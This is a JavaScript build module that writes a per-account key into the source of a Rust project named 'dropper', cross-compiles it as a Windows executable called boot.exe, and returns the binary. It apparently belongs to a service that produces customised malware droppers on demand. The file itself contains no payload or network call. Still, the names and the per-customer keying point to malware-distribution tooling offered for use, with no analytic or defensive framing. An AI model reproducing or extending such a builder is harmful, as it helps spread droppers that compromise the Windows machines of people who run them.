// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DROPPER_DIR = path.join(__dirname, '..', 'dropper');

// Mutex queue to prevent concurrent builds overwriting main.rs
let buildQueue = Promise.resolve();

export function buildBoot({ key, buildId }) {
    const task = async () => {
        const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
        const originalCode = fs.readFileSync(srcPath, 'utf8');

        try {
            // Inject key
            const codeWithKey = originalCode.replace('__ACCOUNT_KEY__', key);
            fs.writeFileSync(srcPath, codeWithKey);

            console.log(`[build] compiling rust dropper for key ${key}...`);
            await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
                cwd: DROPPER_DIR,
                timeout: 5 * 60_000,
            });

            const baseExe = path.join(DROPPER_DIR, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
            const launcherBuf = fs.readFileSync(baseExe);

            return launcherBuf;
        } finally {
            // Revert key safely, even if the build fails
            fs.writeFileSync(srcPath, originalCode);
        }
    };

    // Chain the task so it runs sequentially
    const result = buildQueue.then(task, task);
    buildQueue = result.catch(() => {}); // Prevent queue from stalling on errors
    return result;
}